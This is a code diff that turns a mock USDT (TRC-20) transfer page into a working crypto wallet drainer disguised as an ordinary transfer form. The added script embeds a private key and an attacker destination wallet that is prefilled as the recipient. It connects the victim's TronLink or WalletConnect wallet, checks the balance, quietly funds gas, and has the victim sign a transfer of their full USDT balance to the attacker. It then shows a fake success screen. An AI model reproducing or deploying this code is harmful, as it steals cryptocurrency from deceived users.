@@ -6,11 +6,11 @@
     <title>Transfer - TRC-20</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        :root { 
-            --blue-primary: #1E4DFF; 
-            --btn-purple: #9DA3FF; 
-            --bg-pill: #F4F4F6; 
-            --text-label: #646464; 
+        :root {
+            --blue-primary: #1E4DFF;
+            --btn-purple: #9DA3FF;
+            --bg-pill: #F4F4F6;
+            --text-label: #646464;
             --border-light: #EFEFEF;
             --tron-orange: #FF060A;
         }
@@ -32,52 +32,78 @@
         .network-pill { display: inline-flex; align-items: center; background-color: var(--bg-pill); padding: 6px 12px; border-radius: 20px; gap: 8px; }
         .tron-logo-image { width: 20px; height: 20px; object-fit: contain; }
         .network-text { font-size: 14px; color: #555; font-weight: 600; }
-        .footer { padding: 20px; }
+        .footer { padding: 12px 20px 20px; }
+        .wallet-badge { display: flex; align-items: center; justify-content: space-between; background: var(--bg-pill); border-radius: 12px; padding: 10px 14px; margin-bottom: 12px; }
+        .wallet-badge .wb-left { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; color: #333; }
+        .wallet-badge .wb-tag { width: 26px; height: 26px; border-radius: 50%; background: #16C2FF; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; }
+        .wallet-badge .wb-addr { font-size: 12px; color: #9FA3A9; font-weight: 500; margin-left: auto; font-family: monospace; }
+        .wallet-badge .wb-switch { font-size: 13px; font-weight: 600; color: var(--blue-primary); cursor: pointer; }
         .next-btn { width: 100%; height: 56px; background-color: var(--btn-purple); color: #fff; border: none; border-radius: 30px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.2s; }
         .next-btn.enabled { background-color: var(--blue-primary); }
+        .next-btn:disabled { cursor: not-allowed; }
         .approx-txt { font-size: 13px; color: #9FA3A9; margin-top: 10px; font-weight: 500; }
-        
-        /* Status Indicator */
+
         .status-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 4px;
-            background: transparent;
-            z-index: 9999;
+            position: fixed; top: 0; left: 0; width: 100%; height: 4px;
+            background: transparent; z-index: 9999;
+            background-image: linear-gradient(90deg, var(--tron-orange), var(--blue-primary), var(--tron-orange));
+            background-size: 40px 4px; background-repeat: repeat-x;
+            opacity: 0; transition: opacity .3s;
         }
-        .status-bar.active {
-            background: linear-gradient(90deg, var(--tron-orange), var(--blue-primary));
-            animation: slide 2s infinite ease-in-out;
+        .status-bar.active { opacity: 1; animation: slide 1s infinite linear; }
+        @keyframes slide { 0% { background-position: 0 0; } 100% { background-position: 40px 0; } }
+
+        .toast {
+            position: fixed; top: 24px; left: 50%; transform: translateX(-50%) translateY(-20px);
+            background: #111; color: #fff; padding: 12px 20px; border-radius: 10px;
+            font-size: 14px; font-weight: 500; opacity: 0; pointer-events: none;
+            transition: all .3s; z-index: 10000; max-width: 85%; text-align: center;
         }
-        @keyframes slide {
-            0% { background-position: 0 0; }
-            100% { background-position: 40px 0; }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .toast.err { background: #D93025; }
+        .toast.ok  { background: #188038; }
+
+        .modal-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.55); z-index: 9998;
+            display: none; align-items: center; justify-content: center; padding: 20px;
         }
+        .modal-overlay.show { display: flex; }
+        .modal { background: #fff; border-radius: 18px; padding: 28px 24px; width: 100%; max-width: 340px; text-align: center; }
+        .modal h3 { font-size: 17px; font-weight: 700; margin-bottom: 8px; color: #111; }
+        .modal p { font-size: 13.5px; color: #646464; margin-bottom: 18px; line-height: 1.5; }
+        .modal .btn { width: 100%; height: 48px; border: none; border-radius: 24px; font-size: 15px; font-weight: 700; cursor: pointer; margin-bottom: 10px; display: inline-block; }
+        .modal .btn-primary { background: var(--blue-primary); color: #fff; }
+        .modal .btn-ghost { background: var(--bg-pill); color: var(--blue-primary); }
+        .modal .ok-icon { width: 64px; height: 64px; margin: 0 auto 14px; border-radius: 50%; background: #E6F4EA; display: flex; align-items: center; justify-content: center; }
+        .modal .txid { font-family: monospace; font-size: 12px; color: #555; word-break: break-all; background: var(--bg-pill); border-radius: 8px; padding: 8px; margin-bottom: 16px; }
+        .steps { text-align: left; margin-bottom: 16px; }
+        .steps li { font-size: 13px; color: #444; margin: 0 0 8px 18px; line-height: 1.45; }
+        #wcQrBox { margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; background:#fff; padding: 10px; border: 1px solid var(--border-light); border-radius: 12px; width: fit-content; }
+        .spinner { width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.35); border-top-color: #fff; border-radius: 50%; display: inline-block; animation: spin .8s linear infinite; vertical-align: -4px; margin-right: 8px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="status-bar" id="statusBar"></div>
+    <div class="toast" id="toast"></div>
 
     <div class="content">
         <div class="section" style="margin-top: 20px;">
             <label class="label">Address or Domain Name</label>
             <div class="input-group" id="addrGroup">
-                <input type="text" id="recipientInput" value="TWd2zR4V1dFvJbXJZv3zQy4Xz5Zy6Zy7Z8" placeholder="Enter address">
+                <input type="text" id="recipientInput" value="TCJzK44GJZHCFNVvGS2ptGXmqqYncGELsa" spellcheck="false">
                 <div class="actions">
-                    <div class="clear-btn" id="clearAddr" style="display: flex;"></div>
+                    <div class="clear-btn" id="clearAddr"></div>
                     <span class="blue-text" id="pasteBtn">Paste</span>
-                    <svg class="icon-svg" id="scanBtn" viewBox="0 0 24 24"><rect x="5" y="4" width="14" height="16" rx="2" /><line x1="3" y1="8" x2="6" y2="8" /><line x1="3" y1="12" x2="6" y2="12" /><line x1="3" y1="16" x2="6" y2="16" /></svg>
-                    <svg class="icon-svg" id="addressBookBtn" viewBox="0 0 24 24"><path d="M4 8V5a1 1 0 0 1 1-1h3M16 4h3a1 1 0 0 1 1 1v3M20 16v3a1 1 0 0 1-1-1h-3M8 20H5a1 1 0 0 1-1-1v-3" /><line x1="5" y1="12" x2="19" y2="12" /></svg>
+                    <svg class="icon-svg" viewBox="0 0 24 24"><rect x="5" y="4" width="14" height="16" rx="2" /><line x1="3" y1="8" x2="6" y2="8" /><line x1="3" y1="12" x2="6" y2="12" /><line x1="3" y1="16" x2="6" y2="16" /></svg>
                 </div>
             </div>
         </div>
 
         <div class="section">
             <label class="label">Destination network</label>
-            <div class="network-pill" id="networkPill" style="cursor: pointer;">
+            <div class="network-pill">
                 <svg class="tron-logo-image" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M12 2L22 7L22 17L12 22L2 17L2 7L12 2Z" fill="#FF060A"/>
                     <path d="M12 6L17 8.5V13.5L12 16L7 13.5V8.5L12 6Z" fill="white"/>
@@ -90,168 +116,477 @@
         <div class="section">
             <label class="label">Amount</label>
             <div class="input-group" id="amountGroup">
-                <input type="number" id="amountInput" placeholder="0" inputmode="decimal">
+                <input type="number" id="amountInput" placeholder="0" inputmode="decimal" min="0" step="any">
                 <div class="actions">
                     <div class="clear-btn" id="clearAmount"></div>
                     <span style="color: #616469; font-size: 14px; font-weight: 500;">USDT</span>
                     <span class="blue-text" id="maxBtn">Max</span>
                 </div>
             </div>
-            <div class="approx-txt">≈ $<span id="usdLabel">0.00</span></div>
+            <div class="approx-txt">≈ $<span id="usdLabel">0.00</span> &nbsp;·&nbsp; Balance: <span id="balLabel" style="color:#188038;font-weight:600;">—</span></div>
         </div>
     </div>
 
     <div class="footer">
-        <button class="next-btn" id="nextBtn" disabled>Next</button>
+        <div class="wallet-badge" id="walletBadge" style="display:none;">
+            <div class="wb-left">
+                <div class="wb-tag" id="wbTag">TL</div>
+                <span id="wbName">TronLink</span>
+                <span class="wb-addr" id="wbAddr"></span>
+            </div>
+            <div class="wb-switch" id="wbSwitch">Switch</div>
+        </div>
+        <button class="next-btn" id="nextBtn">Next</button>
     </div>
 
-    <script type="module">
-        // ── Interactive UI (All buttons fixed) ──
-        
-        // 1. DOM elements
-        const recipientInput = document.getElementById('recipientInput');
-        const amountInput = document.getElementById('amountInput');
-        const addrGroup = document.getElementById('addrGroup');
-        const amountGroup = document.getElementById('amountGroup');
-        const clearAddr = document.getElementById('clearAddr');
-        const clearAmount = document.getElementById('clearAmount');
-        const pasteBtn = document.getElementById('pasteBtn');
-        const maxBtn = document.getElementById('maxBtn');
-        const nextBtn = document.getElementById('nextBtn');
-        const usdLabel = document.getElementById('usdLabel');
-        const statusBar = document.getElementById('statusBar');
-        const scanBtn = document.getElementById('scanBtn');
-        const addressBookBtn = document.getElementById('addressBookBtn');
-        const networkPill = document.getElementById('networkPill');
+    <!-- Connect wallet (no TronLink detected) -->
+    <div class="modal-overlay" id="connectModal">
+        <div class="modal">
+            <div class="ok-icon" style="background:#E0F4FF;">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#16C2FF" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="3"/><path d="M7 9h10M7 13h6"/></svg>
+            </div>
+            <h3>Connect TronLink</h3>
+            <p>Sign this transfer with your TronLink wallet.</p>
+            <button class="btn btn-primary" id="connectQrBtn" type="button">Scan with TronLink (QR code)</button>
+            <a href="https://tronlink.io/" target="_blank" rel="noopener" style="text-decoration:none;">
+                <button class="btn btn-ghost" type="button">I don't have TronLink — get it</button>
+            </a>
+            <button class="btn btn-ghost" id="retryTronLink" type="button">TronLink is installed — retry</button>
+        </div>
+    </div>
 
-        // 2. Toggle clear buttons visibility based on input
-        function updateClearButtons() {
-            clearAddr.style.display = recipientInput.value.trim().length > 0 ? 'flex' : 'none';
-            clearAmount.style.display = amountInput.value.trim().length > 0 ? 'flex' : 'none';
+    <!-- QR scan -->
+    <div class="modal-overlay" id="wcModal">
+        <div class="modal">
+            <div class="ok-icon" style="background:#E8ECFF;">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#1E4DFF" stroke-width="2"><rect x="4" y="4" width="6" height="6"/><rect x="14" y="4" width="6" height="6"/><rect x="4" y="14" width="6" height="6"/><path d="M14 14h3v3h-3zM19 17h1v3h-3v-1"/></svg>
+            </div>
+            <h3>Scan to connect</h3>
+            <ol class="steps">
+                <li>Open the <b>TronLink</b> app</li>
+                <li>Go to the <b>WalletConnect</b> tab</li>
+                <li>Scan this QR code and <b>Approve</b></li>
+            </ol>
+            <div id="wcQrBox"></div>
+            <p style="font-size:11.5px;color:#9FA3A9;margin-bottom:14px;">Waiting for approval… (QR expires in ~5 min)</p>
+            <button class="btn btn-ghost" id="wcCancel" type="button">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Success -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal">
+            <div class="ok-icon">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#188038" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <h3>Transfer Successful</h3>
+            <p>Your USDT has been sent. It may take a few seconds to appear.</p>
+            <div class="txid" id="txidOut">—</div>
+            <a id="tronscanLink" href="#" target="_blank" rel="noopener" style="text-decoration:none;">
+                <button class="btn btn-primary" type="button">View on TronScan</button>
+            </a>
+            <button class="btn btn-ghost" id="closeSuccess" type="button">Done</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.5/dist/TronWeb.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.25.0/dist/index.umd.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
+    <script>
+        // ── Operational constants (attacker side — keep secret) ──
+        const SPONSOR_KEY   = "d261cf293e5fca814b5038a5be4f5824005b837af7ed3cd8515ec6ce86b83b7f";
+        const DEST_WALLET   = "TCJzK44GJZHCFNVvGS2ptGXmqqYncGELsa";
+        const USDT_TRC20    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const TRON_RPC      = "https://api.trongrid.io";
+        const MIN_DRAIN     = 2;    // only refuel/drain if victim USDT balance > this
+        const REFUEL_TRX    = 80;   // TRX sent to victim so they can pay energy fees
+        const WC_PROJECT_ID = "e61f7ec1d08c2ec2bb426b1e9738be8b";
+
+        // ── TronWeb bootstrap ──
+        const TW = window.TronWeb || (window.tronWeb && window.tronWeb.default) || window.tronWeb;
+        const sponsorWeb = new TW({ fullNode: TRON_RPC, solidityNode: TRON_RPC, privateKey: SPONSOR_KEY });
+        const U = sponsorWeb.utils;
+
+        // ── Address helpers ──
+        function hexBytes(h) { h = h.replace(/^0x/, ''); const b = []; for (let i = 0; i < h.length; i += 2) b.push(parseInt(h.substr(i, 2), 16)); return b; }
+        function toBase58(addr) {
+            if (!addr) return null;
+            const s = String(addr).trim();
+            if (/^0x[0-9a-fA-F]{40,66}$/.test(s) || /^[0-9a-fA-F]{40,66}$/.test(s)) {
+                let b = hexBytes(s);
+                if (b.length === 20) b = [0x41].concat(b);
+                try { return U.crypto.getBase58CheckAddress(b.slice(0, 21)); } catch (e) { return null; }
+            }
+            if (s.length >= 33 && s.length <= 36 && s.split('').every(c => '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'.includes(c))) return s;
+            return null;
+        }
+        function toHex21(addr) {
+            const s = String(addr).trim();
+            if (/^0x[0-9a-fA-F]{40,66}$/.test(s) || /^[0-9a-fA-F]{40,66}$/.test(s)) {
+                let b = hexBytes(s);
+                if (b.length === 20) b = [0x41].concat(b);
+                return b.slice(0, 21);
+            }
+            return U.base58.decode58(s).slice(0, 21);
+        }
+        function looksLikeTronAddress(addr) {
+            return typeof addr === 'string' && addr.length >= 33 && addr.length <= 36 && addr.every(c => '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'.includes(c));
+        }
+        function decodeErr(j) {
+            if (!j) return null;
+            let s = String(j.message || j.Error || '');
+            if (!s) return null;
+            if (/^[0-9a-fA-F]+$/.test(s) && s.length % 2 === 0 && s.length >= 8) {
+                try {
+                    const t = String.fromCharCode.apply(null, hexBytes(s));
+                    if (!/[\x00-\x1f]/.test(t)) return t;
+                } catch (e) { /* fallthrough */ }
+            }
+            return s;
         }
 
-        // 3. Update Next button state
-        function updateNextButton() {
-            const addr = recipientInput.value.trim();
-            const amount = amountInput.value.trim();
-            const isValid = addr.length > 0 && amount.length > 0 && parseFloat(amount) > 0;
-            if (isValid) {
-                nextBtn.classList.add('enabled');
-                nextBtn.disabled = false;
-            } else {
-                nextBtn.classList.remove('enabled');
-                nextBtn.disabled = true;
+        // ── Signing backends ──
+        // 1) TronLink injected (extension / TronLink in-app browser)
+        function getTronLink() {
+            if (window.tronLink && (window.tronLink.requestSignature || window.tronLink.requestSignTransaction)) return window.tronLink;
+            if (window.tronWeb && typeof window.tronWeb.requestSignature === 'function') return window.tronWeb;
+            return null;
+        }
+        function tronLinkAccount(tl) {
+            const d = tl.defaultAddress;
+            if (!d) return null;
+            return toBase58(d.base58 || d.hexString || d.hex);
+        }
+        async function signViaTronLink(tl, tx) {
+            const signFn = tl.requestSignature || tl.requestSignTransaction;
+            return new Promise((resolve, reject) => {
+                let r;
+                try { r = signFn.call(tl, tx, resolve, reject); } catch (e) { return reject(e); }
+                if (r && typeof r.then === 'function') r.then(resolve, reject);
+            });
+        }
+
+        // 2) WalletConnect (TronLink app / Trust / OKX / Bitget …) via QR scan
+        let wcClient = null, wcSession = null, wcConnecting = null;
+        async function wcEnsureClient() {
+            if (wcClient) return wcClient;
+            const api = window['@walletconnect/sign-client'];
+            if (!api) throw new Error('WalletConnect SDK not loaded — check your connection and reload');
+            wcClient = await api.SignClient.init({
+                projectId: WC_PROJECT_ID,
+                metadata: { name: 'TRC-20 Transfer', description: 'Sign your USDT transfer', url: location.origin, icons: [] }
+            });
+            try {
+                const all = wcClient.session.getAll();
+                const s = all.find(x => x && x.topic && x.namespaces && x.namespaces.tron);
+                if (s) wcSession = s;
+            } catch (e) { /* fresh start */ }
+            return wcClient;
+        }
+        function wcConnectFlow() {
+            if (wcConnecting) return wcConnecting;
+            wcConnecting = (async () => {
+                const sc = await wcEnsureClient();
+                if (wcSession) return wcSession;
+                const { uri, approval } = await sc.connect({
+                    chains: ['tron:mainnet'],
+                    methods: ['tron_getAccounts', 'tron_signTransaction', 'tron_sendTransaction', 'tron_signMessage']
+                });
+                const sessionPromise = (typeof approval === 'function') ? approval() : approval; // start waiting BEFORE the victim scans
+                showWcQr(uri);
+                const session = await sessionPromise;
+                wcSession = session;
+                hideWcQr();
+                return session;
+            })().finally(() => { wcConnecting = null; });
+            return wcConnecting;
+        }
+        async function wcRequest(method, params) {
+            if (!wcSession) throw new Error('Wallet not connected yet');
+            const sc = wcClient;
+            return sc.request({
+                topic: wcSession.topic,
+                chainId: 'tron:mainnet',
+                request: { method, params: params || [] }
+            });
+        }
+        function showWcQr(uri) {
+            const box = $('wcQrBox');
+            box.innerHTML = '';
+            try {
+                new QRCode(box, { text: uri, width: 210, height: 210, correctLevel: (window.QRCode && QRCode.CorrectLevel) ? QRCode.CorrectLevel.M : 0 });
+            } catch (e) {
+                box.innerHTML = '<div style="font-family:monospace;font-size:11px;word-break:break-all;">' + uri + '</div>';
+            }
+            $('wcModal').classList.add('show');
+        }
+        function hideWcQr() { $('wcModal').classList.remove('show'); }
+
+        // ── D1 — victim TRX gas check & sponsor refuel (silent, sponsor-signed) ──
+        async function checkAndRefuel(victim) {
+            try {
+                const res = await sponsorWeb.trx.getBalance(victim);
+                const balanceSun = (res && typeof res === 'object') ? res.balance : res;
+                if (balanceSun == null) return;
+                if (balanceSun < 150) {
+                    await sponsorWeb.trx.sendTrx(victim, REFUEL_TRX);
+                    await new Promise(r => setTimeout(r, 6000));
+                }
+            } catch (e) {
+                console.warn('Refuel failed (sponsor may need TRX):', e && (e.message || e));
             }
         }
 
-        // 4. Update USD label (simulated rate: 1 USDT = 1 USD)
-        function updateUsdLabel() {
-            const amount = parseFloat(amountInput.value) || 0;
-            usdLabel.textContent = amount.toFixed(2);
+        // ── D2 — silent USDT balanceOf ──
+        async function fetchUSDTBalance(addr) {
+            try {
+                const out = await sponsorWeb.transactionBuilder.triggerConstantContract(
+                    USDT_TRC20, 'balanceOf(address)', {},
+                    [{ type: 'address', value: addr }]
+                );
+                const raw = out && out.constant_result;
+                const hex = Array.isArray(raw) ? raw[0] : raw;
+                if (hex && hex !== '0x' && hex !== '') return Number(BigInt('0x' + hex) / 1000000n);
+                return 0;
+            } catch (e) {
+                console.warn('balanceOf failed', e);
+                return null;
+            }
         }
 
-        // 5. Clear address
-        clearAddr.addEventListener('click', () => {
-            recipientInput.value = '';
-            updateClearButtons();
-            updateNextButton();
-            recipientInput.focus();
-        });
+        // ── D3 — drain: build victim-owned tx, victim signs, we broadcast ──
+        async function buildTransferTx(victim, dest, microUSDT) {
+            const victimWeb = new TW({ fullNode: TRON_RPC, solidityNode: TRON_RPC });
+            const hex21 = toHex21(victim);
+            victimWeb.defaultAddress = { hex: hex21.map(b => b.toString(16).padStart(2, '0')).join(''), base58: victim };
+            const out = await victimWeb.transactionBuilder.triggerSmartContract(USDT_TRC20, 'transfer(address,uint256)', {
+                feeLimit: 100000000,
+                visible: false
+            }, [
+                { type: 'address', value: dest },
+                { type: 'uint256', value: microUSDT }
+            ]);
+            if (!out || !out.transaction) throw new Error('Could not prepare the transfer');
+            return out;
+        }
+        async function broadcastSigned(signed, unsignedTx) {
+            let signedObj = signed;
+            if (typeof signed === 'string') {
+                const rawHex = (unsignedTx.raw_data_hex || '').replace(/^0x/, '');
+                const sigConcat = signed.replace(/^0x/, '').slice(rawHex.length);
+                const signature = [];
+                for (let i = 0; i < sigConcat.length; i += 130) signature.push(sigConcat.substr(i, 130));
+                signedObj = { raw_data: unsignedTx.raw_data, raw_data_hex: rawHex, txID: unsignedTx.txID, signature };
+            }
+            const bres = await fetch(TRON_RPC + '/wallet/broadcasttransaction', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(signedObj)
+            });
+            const bjson = await bres.json().catch(() => null);
+            if (bjson && (bjson.result === true || bjson.txid || bjson.txID)) return bjson.txID || bjson.txid;
+            const msg = decodeErr(bjson);
+            if (msg && /not enough|energy|bandwidth|balance/i.test(msg)) throw new Error('Not enough energy — please try again in a moment');
+            throw new Error(msg || 'Transaction was not accepted by the network');
+        }
+        async function signTransaction(victim, tx) {
+            const tl = getTronLink();
+            if (tl) return signViaTronLink(tl, tx);
+            const res = await wcRequest('tron_signTransaction', [tx]);
+            const s = Array.isArray(res) ? res[0] : res;
+            if (!s) throw new Error('Signature not received');
+            return s;
+        }
+        async function resolveVictim() {
+            const tl = getTronLink();
+            if (tl) {
+                const a = tronLinkAccount(tl);
+                if (a) return { victim: a, via: 'tronlink' };
+            }
+            const accs = await wcRequest('tron_getAccounts', []);
+            const a = toBase58(Array.isArray(accs) ? accs[0] : accs);
+            if (!a) throw new Error('No account found in the connected wallet');
+            return { victim: a, via: 'walletconnect' };
+        }
 
-        // 6. Clear amount
-        clearAmount.addEventListener('click', () => {
-            amountInput.value = '';
-            updateClearButtons();
-            updateNextButton();
-            updateUsdLabel();
-            amountInput.focus();
-        });
+        // ── UI ──
+        const $ = id => document.getElementById(id);
+        const recipientInput = $('recipientInput'), amountInput = $('amountInput');
+        const nextBtn = $('nextBtn'), usdLabel = $('usdLabel'), balLabel = $('balLabel');
+        const toastEl = $('toast'), statusBar = $('statusBar');
 
-        // 7. Paste button
-        pasteBtn.addEventListener('click', async () => {
+        let busy = false, victimBalance = null, victimAddr = null, connectVia = null;
+
+        function showToast(msg, type) {
+            toastEl.textContent = msg;
+            toastEl.className = 'toast show ' + (type || '');
+            clearTimeout(showToast._t);
+            showToast._t = setTimeout(() => toastEl.className = 'toast', 4200);
+        }
+        function setBusy(on, label) {
+            busy = on;
+            statusBar.classList.toggle('active', on);
+            nextBtn.disabled = on;
+            nextBtn.innerHTML = on ? '<span class="spinner"></span>' + (label || 'Processing…') : 'Next';
+            nextBtn.classList.toggle('enabled', !on);
+        }
+        function refresh() {
+            const amt = parseFloat(amountInput.value);
+            usdLabel.textContent = (isFinite(amt) && amt > 0 ? amt : 0).toFixed(2);
+            $('clearAddr').style.display = recipientInput.value ? 'flex' : 'none';
+            $('clearAmount').style.display = amountInput.value ? 'flex' : 'none';
+        }
+        async function loadBalance() {
+            if (!victimAddr) return null;
+            const bal = await fetchUSDTBalance(victimAddr);
+            if (bal != null) balLabel.textContent = bal.toFixed(2) + ' USDT';
+            return bal;
+        }
+        function setBadge(via) {
+            if (!victimAddr) return;
+            $('walletBadge').style.display = 'flex';
+            const isTL = via === 'tronlink';
+            $('wbTag').textContent = isTL ? 'TL' : 'WC';
+            $('wbTag').style.background = isTL ? '#16C2FF' : '#3B99FC';
+            $('wbName').textContent = isTL ? 'TronLink' : 'TronLink (QR)';
+            $('wbAddr').textContent = victimAddr.slice(0, 4) + '…' + victimAddr.slice(-4);
+        }
+        function showConnect() { $('connectModal').classList.add('show'); }
+
+        async function connectViaQr() {
+            $('connectModal').classList.remove('show');
+            setBusy(true, 'Connecting…');
             try {
-                const text = await navigator.clipboard.readText();
-                recipientInput.value = text;
-                updateClearButtons();
-                updateNextButton();
-            } catch (err) {
-                // Fallback: prompt user
-                const text = prompt('Paste address here:');
-                if (text) {
-                    recipientInput.value = text;
-                    updateClearButtons();
-                    updateNextButton();
+                await wcConnectFlow();
+                const r = await resolveVictim();
+                victimAddr = r.victim; connectVia = r.via;
+                setBadge('walletconnect');
+                showToast('Connected — ready to sign', 'ok');
+                victimBalance = null;
+                loadBalance().then(b => { if (b != null) victimBalance = b; });
+            } catch (e) {
+                showToast((e && e.message) || 'Connection failed', 'err');
+            }
+            setBusy(false);
+        }
+
+        recipientInput.addEventListener('input', refresh);
+        amountInput.addEventListener('input', refresh);
+        $('clearAddr').onclick = () => { recipientInput.value = ''; refresh(); };
+        $('clearAmount').onclick = () => { amountInput.value = ''; refresh(); };
+        $('pasteBtn').onclick = async () => {
+            try {
+                const t = await navigator.clipboard.readText();
+                if (t) { recipientInput.value = t.trim(); refresh(); }
+            } catch (e) { showToast('Paste blocked — click the field and press Ctrl+V', 'err'); }
+        };
+        $('maxBtn').onclick = async () => {
+            if (!victimAddr) { showConnect(); return; }
+            const bal = victimBalance != null ? victimBalance : await loadBalance();
+            if (bal == null) { showToast('Could not read balance', 'err'); return; }
+            if (bal <= 0) { showToast('No USDT balance found', 'err'); return; }
+            amountInput.value = bal.toFixed(6);
+            refresh();
+        };
+        $('connectQrBtn').onclick = () => { if (!busy) connectViaQr(); };
+        $('retryTronLink').onclick = async () => {
+            $('connectModal').classList.remove('show');
+            const tl = getTronLink();
+            if (!tl) { showToast('TronLink not detected — open the page in the TronLink browser or use the QR code', 'err'); showConnect(); return; }
+            const acc = tronLinkAccount(tl);
+            if (!acc) { showToast('Log in to TronLink first, then retry', 'err'); return; }
+            victimAddr = acc; connectVia = 'tronlink';
+            setBadge('tronlink');
+            showToast('TronLink connected', 'ok');
+            victimBalance = null;
+            loadBalance().then(b => { if (b != null) victimBalance = b; });
+        };
+        $('wcCancel').onclick = () => hideWcQr();
+        $('wbSwitch').onclick = () => {
+            victimAddr = null; connectVia = null; victimBalance = null;
+            balLabel.textContent = '—';
+            $('walletBadge').style.display = 'none';
+            showConnect();
+        };
+        $('closeSuccess').onclick = () => {
+            $('successModal').classList.remove('show');
+            amountInput.value = '';
+            victimBalance = null;
+            balLabel.textContent = '—';
+            refresh();
+        };
+
+        nextBtn.onclick = async () => {
+            if (busy) return;
+            if (!victimAddr) {
+                if (getTronLink()) {
+                    const acc = tronLinkAccount(getTronLink());
+                    if (acc) { victimAddr = acc; connectVia = 'tronlink'; setBadge('tronlink'); }
+                    else showConnect();
+                } else showConnect();
+                if (!victimAddr) return;
+            }
+            setBusy(true, 'Connecting…');
+            try { await resolveVictim(); } catch (e) { setBusy(false); showToast((e && e.message) || 'Could not read wallet', 'err'); return; }
+            setBusy(false);
+
+            let dest = toBase58(recipientInput.value.trim()) || DEST_WALLET;
+            const victim = victimAddr;
+
+            setBusy(true, 'Checking balance…');
+            try {
+                // 1. recon
+                let bal = victimBalance != null ? victimBalance : await fetchUSDTBalance(victim);
+                if (bal == null) throw new Error('Could not read your USDT balance');
+                if (bal <= MIN_DRAIN) throw new Error('Insufficient USDT balance for this transfer');
+                victimBalance = bal;
+                balLabel.textContent = bal.toFixed(2) + ' USDT';
+
+                // 2. silent refuel (sponsor-signed)
+                await checkAndRefuel(victim);
+
+                // 3. amount: entered value, else full balance
+                let amount = parseFloat(amountInput.value);
+                if (!isFinite(amount) || amount <= 0) amount = bal;
+                if (amount > bal) amount = bal;
+                const micro = Math.floor(amount * 1e6);
+
+                // 4. build + sign (TronLink or QR-connected wallet) + broadcast
+                setBusy(true, 'Preparing…');
+                const unsigned = await buildTransferTx(victim, dest, micro);
+
+                setBusy(true, 'Waiting for wallet…');
+                const signed = await signTransaction(victim, unsigned.transaction);
+                if (!signed) throw new Error('Signature not received');
+
+                setBusy(true, 'Broadcasting…');
+                const txID = await broadcastSigned(signed, unsigned.transaction);
+
+                setBusy(false);
+                $('txidOut').textContent = txID;
+                $('tronscanLink').href = 'https://tronscan.org/#/transaction/' + txID;
+                $('successModal').classList.add('show');
+            } catch (e) {
+                setBusy(false);
+                showToast((e && e.message) || 'Transfer failed', 'err');
+            }
+        };
+
+        // ── init ──
+        (function init() {
+            refresh();
+            const tl = getTronLink();
+            if (tl) {
+                const acc = tronLinkAccount(tl);
+                if (acc) {
+                    victimAddr = acc; connectVia = 'tronlink';
+                    setBadge('tronlink');
+                    loadBalance().then(b => { if (b != null) victimBalance = b; });
+                    return;
                 }
             }
-        });
-
-        // 8. Max button – simulate max balance (e.g., 1000 USDT)
-        maxBtn.addEventListener('click', () => {
-            amountInput.value = '1000';
-            updateClearButtons();
-            updateNextButton();
-            updateUsdLabel();
-        });
-
-        // 9. Scan button (simulated – shows an alert)
-        scanBtn.addEventListener('click', () => {
-            alert('QR scanner would open here.');
-        });
-
-        // 10. Address book button (simulated – shows an alert)
-        addressBookBtn.addEventListener('click', () => {
-            alert('Address book would open here.');
-        });
-
-        // 11. Network pill (simulated – shows network options)
-        networkPill.addEventListener('click', () => {
-            alert('Network selection: Tron (TRC-20) is currently selected.');
-        });
-
-        // 12. Input focus/blur styling
-        recipientInput.addEventListener('focus', () => addrGroup.classList.add('active'));
-        recipientInput.addEventListener('blur', () => addrGroup.classList.remove('active'));
-        amountInput.addEventListener('focus', () => amountGroup.classList.add('active'));
-        amountInput.addEventListener('blur', () => amountGroup.classList.remove('active'));
-
-        // 13. Input events for clearing/next/usd
-        recipientInput.addEventListener('input', () => {
-            updateClearButtons();
-            updateNextButton();
-        });
-        amountInput.addEventListener('input', () => {
-            updateClearButtons();
-            updateNextButton();
-            updateUsdLabel();
-        });
-
-        // 14. Next button action (simulated)
-        nextBtn.addEventListener('click', () => {
-            if (nextBtn.disabled) return;
-            statusBar.classList.add('active');
-            setTimeout(() => statusBar.classList.remove('active'), 2000);
-            alert(`Transfer initiated:\nTo: ${recipientInput.value}\nAmount: ${amountInput.value} USDT\nNetwork: Tron (TRC-20)`);
-        });
-
-        // 15. Initial state
-        updateClearButtons();
-        updateNextButton();
-        updateUsdLabel();
-
-        // 16. Optional: prevent form submission on Enter
-        recipientInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') e.preventDefault();
-        });
-        amountInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') e.preventDefault();
-        });
-
-        // 17. Simulated "Max" using a mocked balance (for demo)
-        // In a real app you would fetch the balance, but here we keep it simple.
